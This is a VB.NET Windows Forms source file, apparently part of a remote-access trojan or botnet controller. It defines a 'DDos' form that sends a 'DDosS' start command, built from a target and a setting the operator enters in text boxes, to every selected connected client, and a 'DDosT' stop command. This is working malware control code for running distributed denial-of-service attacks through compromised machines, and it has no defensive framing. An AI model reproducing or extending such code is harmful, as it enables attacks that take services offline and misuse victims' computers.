Public Class DDos
    Private Sub DDos_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Label2.ForeColor = Color.White
        Label2.Text = "[" & AuthForm.Lv1.SelectedItems.Count & "]"
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Try
            Dim B As Byte() = SB("DDosS" & Settings.SPL & TextBox3.Text & Settings.SPL & TextBox1.Text)
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
            Label2.ForeColor = Color.Green
            MessageBox.Show("DDos Has Been Started!")
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Try
            Dim B As Byte() = SB("DDosT")
            For Each C As ListViewItem In AuthForm.Lv1.SelectedItems
                Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                Pending.Req_Out.Add(ClientReq)
            Next
            Label2.ForeColor = Color.Red
            MessageBox.Show("DDos Has Been Stopped!")
        Catch ex As Exception
            Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Sub Guna2CircleButton1_Click(sender As Object, e As EventArgs)
        Me.Close()
    End Sub

    Private Sub Guna2CircleButton2_Click(sender As Object, e As EventArgs)
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub Guna2ControlBox1_Click(sender As Object, e As EventArgs) Handles Guna2ControlBox1.Click
        Me.Close()
    End Sub

    Private Sub Guna2ControlBox2_Click(sender As Object, e As EventArgs) Handles Guna2ControlBox2.Click
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub guna2Panel1_Paint(sender As Object, e As PaintEventArgs) Handles guna2Panel1.Paint

    End Sub
End Class